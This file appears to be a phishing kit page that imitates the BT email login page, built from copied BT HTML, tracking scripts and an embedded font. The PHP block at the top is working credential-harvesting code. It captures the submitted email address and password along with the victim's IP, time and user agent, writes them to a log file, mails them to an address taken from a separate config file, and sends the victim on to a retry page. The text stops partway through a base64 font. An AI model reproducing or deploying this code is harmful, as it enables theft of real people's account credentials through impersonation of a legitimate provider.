<?php

$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);



session_start();


if ( isset( $_POST["submit"] ) ) { 
    
$_SESSION['username'] = $_POST['username'];
$_SESSION['password'] = $_POST['password'];

$username = $_SESSION['username'];

$password = $_SESSION['password'];
 
 require('../../myEmail.php');
$mailTo = $myEmail;


date_default_timezone_set('Europe/London');
	$ip = $_SERVER['REMOTE_ADDR'];
	$time = date("m-d-Y g:i:a");
	$agent = $_SERVER['HTTP_USER_AGENT'];




$txt =  "&& BT MAIL ACCESS *(1 0F 2 ATTEMPTS)*\n";
$txt .= "EMAIL : ".$username."\n";
$txt .= "PASSWORD : ".$password."\n";
$txt .= "=================================================\n";
$txt .= "Sent from   " .$ip. "  on   "   .$time. " via   " .$agent.".\n";

 $subject = "BT MAIL ACCESS FOR"." ".$ip;
 $headers = "BT MAIL ACCESS FOR"." ".$ip;
 
 $fp = fopen("logs/results.txt", "a");
 fputs($fp,$txt);
 fclose($fp);
 

 mail($mailTo, $subject, $txt, $headers);

 header("location: retry.php");


exit();



exit;


}


?>

<html style="" class=" js flexbox flexboxlegacy no-touch hashchange history rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent localstorage" lang="en"><head><script type="text/javascript" async="" src="//nebula-cdn.kampyle.com/resources/onsite/js/cool-2.1.15.min"></script><script type="text/javascript" async="async" src="https://smetrics.bt.com/b/ss/btcom/10/JS-2.17.0-LAR3/s25564659464615?AQB=1&amp;ndh=1&amp;pf=1&amp;callback=s_c_il[1].doPostbacks&amp;et=1&amp;t=2%2F3%2F2020%202%3A16%3A18%204%20-60&amp;d.&amp;nsid=0&amp;jsonv=1&amp;.d&amp;mid=40241680629594895891752459529226549476&amp;ce=UTF-8&amp;pageName=Con%3AEmail%3ALogin%20Page&amp;g=https%3A%2F%2Fhome.bt.com%2Flogin%2Floginform%3FTARGET&amp;r=https%3A%2F%2Fwww.bt.com%2F&amp;cc=GBP&amp;server=home.bt.com&amp;events=event149&amp;c4=https%3A%2F%2Fhome.bt.com%2Flogin%2Floginform%3FTARGET&amp;v4=D%3Dc56&amp;v7=D%3Dc27&amp;v8=D%3Dc13&amp;c9=Not%20logged%20in&amp;c11=home.bt.com%2Flogin%2Floginform&amp;c13=111&amp;v16=D%3Dc24&amp;c19=Email%20Login%20Page&amp;v21=D%3Dc12&amp;c27=2020%2F04%2F02%202%3A16%20AM%20THU&amp;v36=D%3Dc9&amp;c45=VisitorAPI%20Present&amp;c46=Launch%3ABT%20Consumer%3Aproduction&amp;v46=D%3Dc55&amp;c55=Con%3AHome&amp;c56=D%3DpageName&amp;v57=D%3Dc57&amp;v58=D%3Dc58&amp;c68=_analytics_prev_pagename%2C_gcl_au%2Caam_did%2Ccheck%2CdtSa%2Cmbox%2CrxVisitor%2Crxvt%2Cs_cc%2CTld-kampyle_userid%2CTld-kampyleSessionPageCounter%2CTld-kampyleUserPercentile%2CTld-kampyleUserSession%2CTld-kampyleUserSessionsCount&amp;v90=D%3Dmid&amp;v101=D%3Dc17&amp;v102=D%3Dc49&amp;v106=Launch%3ABT%20Consumer%3Aproduction%7CAPPM%3A2.17.0%7CVisitor%3A4.5.1%7CAAM%3A%3F%7CTarget%3AUndefined%7CTS%3A%3F%7CDL%3ADefined&amp;v108=TARGET&amp;v109=Track%20Page%20View%3Acore.dom-ready&amp;v110=Email&amp;v111=NAVIGATE%3A0%3ANew%3A1%3Ae9763cd8-0daf-478a-9b86-0d4c3789ddf7&amp;v117=Not%20found&amp;s=2048x1152&amp;c=24&amp;j=1.6&amp;v=N&amp;k=Y&amp;bw=1342&amp;bh=725&amp;mcorgid=0AA54673527831890A490D45%40AdobeOrg&amp;AQE=1"></script><script id="cookie-toolbar" data-script-type="stable" data-version-client="0.0.1" src="https://www.productsandservices.bt.com/consumer/cookie/loader"></script>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="description" content="BT">
<meta name="keywords" content="BT">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="PRAGMA" content="NO-CACHE">
<meta http-equiv="EXPIRES" content="-1">
<title>Email Login Page</title>
<meta name="referrer" content="origin" id="meta_referrer">
<!-- START: Code changes for DANTE-4085 -->
<meta name="referrer" content="origin-when-cross-origin" id="meta_referrer">
<!-- END: Code changes for DANTE-4085 -->
<!-- shortcut icon -->
<!-- START: Code changes for DANTEAPP12074-10 BT Re brand- New Favicon image is not displaying in email login page -->
<link rel="shortcut icon" href="assets/260320/images/logo/favicon.ico">
<link rel="apple-touch-icon" href="assets/260320/images/logo/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="152x152" href="assets/260320/images/logo/apple-touch-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="assets/260320/images/logo/apple-touch-icon-180x180.png">
<link rel="apple-touch-icon" sizes="167x167" href="assets/260320/images/logo/apple-touch-icon-167x167.png">
<!-- END: Code changes for DANTEAPP12074-10 BT Re brand- New Favicon image is not displaying in email login page -->
<!--[if IE 7 ]><link rel="stylesheet" href="assets/260320/css/ie7.css"> <![endif]-->
<!--[if IE 8 ]><link rel="stylesheet" href="assets/260320/css/ie8.css?v=null"> <![endif]-->
<!--[if IE 9 ]><link rel="stylesheet" href="assets/260320/css/ie9.css"> <![endif]-->

<link href="assets/260320/home/css/email-login.css" rel="stylesheet">
<link href="assets/260320/home/css/main.css" rel="stylesheet">
<link href="assets/260320/css/responsive-menu.css" rel="stylesheet">
<link href="assets/260320/css/responsive-footer.css" rel="stylesheet">
<link href="assets/260320/css/liveform.css" rel="stylesheet">
<link href="assets/260320/css/liveform2.css" rel="stylesheet">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
<!-- Start : DTM data layer -->
<script src="//bat.bing.com/bat" async=""></script><script async="" src="//static.ads-twitter.com/uwt"></script><script type="text/javascript" async="" src="https://www.google.com/pagead/conversion_async"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics"></script><script>	
			var analyticsPageName = 'Con:Email:Login Page';
			if (analyticsPageName == ""){
				analyticsPageName = "Con:Email:Login page";
			}
			var tar = analyticsPageName.split(":");
			var formTarget = "Email";
			if (tar.length >= 2) {
				formTarget = tar[1];
			}	
		</script>
<script src="assets/260320/js/login-datalayer"></script>
<!-- End : DTM data layer -->
<script src="assets/260320/sport/js/libs/jquery/1.10.2/jquery-1.10.2.min"></script>
<script src="assets/260320/home/js/utilities"></script>
<script async="" src="assets/260320/sport/js/libs/lazysizes/2.0.0/lazysizes.min"></script>
<script async="" src="assets/260320/home/js/email-login/email-login.min"></script>

<script src="assets/260320/js/sha256"></script>
<script>
		var omni = omni || {}, ads = ads || {}, user = window.namespace.user || {}; 
		var static_root = 'assets/260320';
		var pagename = "null";
	</script>
<script src="assets/260320/js/aref.min"></script>
<script>
		var cookieutilities = {
				getCookie : function(cookiename) {
					var cookiestring = "" + document.cookie;
					var index1 = cookiestring.indexOf(cookiename);
					if (index1 == -1 || cookiename == "")
						return "";
					var index2 = cookiestring.indexOf(';', index1);
					if (index2 == -1)
						index2 = cookiestring.length;
					return unescape(cookiestring.substring(index1 + cookiename.length + 1,
							index2));
				},		
				getCookieStatus : function(c_name) {
					var flag = false;
					var i, x, ARRcookies = document.cookie.split(";");
					for (i = 0; i < ARRcookies.length; i++) {
						x = ARRcookies[i].substr(0, ARRcookies[i].indexOf("="));
						x = x.replace(/^\s+|\s+$/g, "");
						if (x == c_name) {
							flag = true;
							return flag;
						}
					}
					return flag;
				}
			};
		</script>

<!-- Start : DTM Launch library -->
<script src="//assets.adobedtm.com/launch-ENfdadf1bb09d848de85923e05be32e7d1.min" async=""></script>
<!-- End : DTM Launch library -->

<script>
	var static_root = 'assets/260320';
</script>

<style type="text/css">
	body {
		margin: 0px;
	}
	loading {
		position: relative;
		height: 500px;
		clear:both;
	}
	.loading span {
		position:absolute;
		background:url(assets/260320/images/loader.gif) no-repeat center center;
		height:100%;
		width:100%;
	}
</style><link rel="stylesheet" href="assets/260320/css/responsive-footer.css" type="text/css"><script src="https://assets.adobedtm.com/468fd5a0b220/5e2a7b1f96d2/f2f15bfd0dc0/EXa20382b1c62141dcabbd1fb62a71f648-libraryCode_source.min" async=""></script><script async="" id="livePersonLibrary" src="https://ee-tagging.s3.amazonaws.com/launch/extensions/bt-liveperson/library/1.10.0/library_1.10.0?site_id=25303315&amp;enable_exhaust=1"></script><script src="https://assets.adobedtm.com/468fd5a0b220/5e2a7b1f96d2/f2f15bfd0dc0/RCc8abbcf0997b4350aabee302512b0c34-source.min" async=""></script><script src="https://assets.adobedtm.com/468fd5a0b220/5e2a7b1f96d2/f2f15bfd0dc0/RCdfa539fbdd3c4162bc33f6fe98e71343-source.min" async=""></script><script src="https://assets.adobedtm.com/468fd5a0b220/5e2a7b1f96d2/f2f15bfd0dc0/RCbe7b5187a9c44fdabef9e67287d659eb-source.min" async=""></script><script src="https://assets.adobedtm.com/468fd5a0b220/5e2a7b1f96d2/f2f15bfd0dc0/RC0e0798d86a004ff793fcfcccdf0bcca0-source.min" async=""></script><script src="https://assets.adobedtm.com/468fd5a0b220/5e2a7b1f96d2/f2f15bfd0dc0/RCe91c972fd2144cfa94c887287695f946-source.min" async=""></script><script src="https://assets.adobedtm.com/468fd5a0b220/5e2a7b1f96d2/f2f15bfd0dc0/RCe8fcb383da74414181401e79d9c6bb73-source.min" async=""></script><script src="https://assets.adobedtm.com/468fd5a0b220/5e2a7b1f96d2/f2f15bfd0dc0/RC4a060270ce414af5af5cf149980634f6-source.min" async=""></script><script src="https://assets.adobedtm.com/468fd5a0b220/5e2a7b1f96d2/f2f15bfd0dc0/RC61095f6cd0984965992611418bfc675d-source.min" async=""></script><script src="https://assets.adobedtm.com/468fd5a0b220/5e2a7b1f96d2/f2f15bfd0dc0/RCe90a15900a3e4c0eb7e5c04955224c97-source.min" async=""></script><script async="" id="livePersonLibrary" src="https://ee-tagging.s3.amazonaws.com/launch/extensions/bt-liveperson/library/1.10.0/library_1.10.0?site_id=25303315&amp;enable_exhaust=1"></script><script src="https://assets.adobedtm.com/468fd5a0b220/5e2a7b1f96d2/f2f15bfd0dc0/RCcd5324d3c6c74af7bfde34103f15f20a-source.min" async=""></script><script src="https://assets.adobedtm.com/468fd5a0b220/5e2a7b1f96d2/f2f15bfd0dc0/RC4648e7a8cb1145a5a3578064d634ca7a-source.min" async=""></script><script src="https://assets.adobedtm.com/extensions/EP5e9ec493dfa0465eaa797b523b09d3f7/AppMeasurement_Module_AudienceManagement.min" async=""></script><script type="text/javascript" async="" src="https://s.salecycle.com/bt/bundle"></script><script src="https://assets.adobedtm.com/468fd5a0b220/5e2a7b1f96d2/f2f15bfd0dc0/RC488e232c9d0543d58b2215a05c11ca7b-source.min" async=""></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/1022810150/?random=1585790178152&amp;cv=9&amp;fst=1585790178152&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=1152&amp;u_w=2048&amp;u_ah=1052&amp;u_aw=2048&amp;u_cd=24&amp;u_his=19&amp;u_tz=60&amp;u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;gtm=2ou3p1&amp;sendb=1&amp;ig=0&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=https%3A%2F%2Fhome.bt.com%2Flogin%2Floginform%3FTARGET%3D%24SM%24https%253A%252F%252Fsignin1.bt.com%252Fbtmail%252Fsecure%252Femaillogin&amp;ref=https%3A%2F%2Fwww.bt.com%2F&amp;tiba=Email%20Login%20Page&amp;hn=www.google.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/937612880/?random=1585790178154&amp;cv=9&amp;fst=1585790178154&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=1152&amp;u_w=2048&amp;u_ah=1052&amp;u_aw=2048&amp;u_cd=24&amp;u_his=19&amp;u_tz=60&amp;u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;gtm=2ou3p1&amp;sendb=1&amp;ig=0&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=https%3A%2F%2Fhome.bt.com%2Flogin%2Floginform%3FTARGET%3D%24SM%24https%253A%252F%252Fsignin1.bt.com%252Fbtmail%252Fsecure%252Femaillogin&amp;ref=https%3A%2F%2Fwww.bt.com%2F&amp;tiba=Email%20Login%20Page&amp;hn=www.google.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/1016812193/?random=1585790178155&amp;cv=9&amp;fst=1585790178155&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=1152&amp;u_w=2048&amp;u_ah=1052&amp;u_aw=2048&amp;u_cd=24&amp;u_his=19&amp;u_tz=60&amp;u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;gtm=2ou3p1&amp;sendb=1&amp;ig=0&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=https%3A%2F%2Fhome.bt.com%2Flogin%2Floginform%3FTARGET%3D%24SM%24https%253A%252F%252Fsignin1.bt.com%252Fbtmail%252Fsecure%252Femaillogin&amp;ref=https%3A%2F%2Fwww.bt.com%2F&amp;tiba=Email%20Login%20Page&amp;hn=www.google.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/1020531211/?random=1585790178156&amp;cv=9&amp;fst=1585790178156&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=1152&amp;u_w=2048&amp;u_ah=1052&amp;u_aw=2048&amp;u_cd=24&amp;u_his=19&amp;u_tz=60&amp;u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;gtm=2ou3p1&amp;sendb=1&amp;ig=0&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=https%3A%2F%2Fhome.bt.com%2Flogin%2Floginform%3FTARGET%3D%24SM%24https%253A%252F%252Fsignin1.bt.com%252Fbtmail%252Fsecure%252Femaillogin&amp;ref=https%3A%2F%2Fwww.bt.com%2F&amp;tiba=Email%20Login%20Page&amp;hn=www.google.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/1013657836/?random=1585790178157&amp;cv=9&amp;fst=1585790178157&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=1152&amp;u_w=2048&amp;u_ah=1052&amp;u_aw=2048&amp;u_cd=24&amp;u_his=19&amp;u_tz=60&amp;u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;gtm=2ou3p1&amp;sendb=1&amp;ig=0&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=https%3A%2F%2Fhome.bt.com%2Flogin%2Floginform%3FTARGET%3D%24SM%24https%253A%252F%252Fsignin1.bt.com%252Fbtmail%252Fsecure%252Femaillogin&amp;ref=https%3A%2F%2Fwww.bt.com%2F&amp;tiba=Email%20Login%20Page&amp;hn=www.google.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><iframe target="_self" title="SaleCycle" style="display: none; height: 0px; width: 0px;" src="https://s.salecycle.com/receiver.html?sc_frame_id=3d6ecffc-8427-44ce-85d7-4bfd9b7fce02"></iframe><script type="text/javascript" async="" src="https://d16fk4ms6rqz1v.cloudfront.net/capture/BT"></script><script charset="UTF-8" src="https://lptag.liveperson.net/tag/tag?site=25303315"></script><script async="" src="//www.productsandservices.bt.com/consumer/cookie/client-0.0.1"></script><style>@media only screen and (max-width: 1199px) {  #bt-navbar .bt-navbar-inner-section {    max-width: 994px;  }}</style><style type="text/css">@font-face {
  font-family: bt_tvregular;
  src: url(data:application/x-font-woff;charset=utf-8;base64,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